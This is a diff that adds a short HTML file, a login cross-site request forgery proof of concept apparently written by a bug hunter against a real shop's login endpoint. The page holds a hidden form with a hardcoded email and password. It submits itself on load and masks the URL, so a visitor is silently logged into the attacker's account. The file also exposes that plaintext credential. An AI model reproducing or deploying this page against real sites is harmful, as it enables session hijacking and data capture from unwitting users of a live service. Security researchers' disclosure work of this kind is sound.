@@ -1,0 +1,16 @@
+<html>
+  <!-- CSRF PoC - Professor the Bug Hunter -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://shop.grindr.com/account/login" method="POST">
+      <input type="hidden" name="form&#95;type" value="customer&#95;login" />
+      <input type="hidden" name="utf8" value="ï&#191;&#189;Å&#147;â&#128;&#156;" />
+      <input type="hidden" name="customer&#91;email&#93;" value="bughuntar1&#64;gmail&#46;com" />
+      <input type="hidden" name="customer&#91;password&#93;" value="123456789St&#35;" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
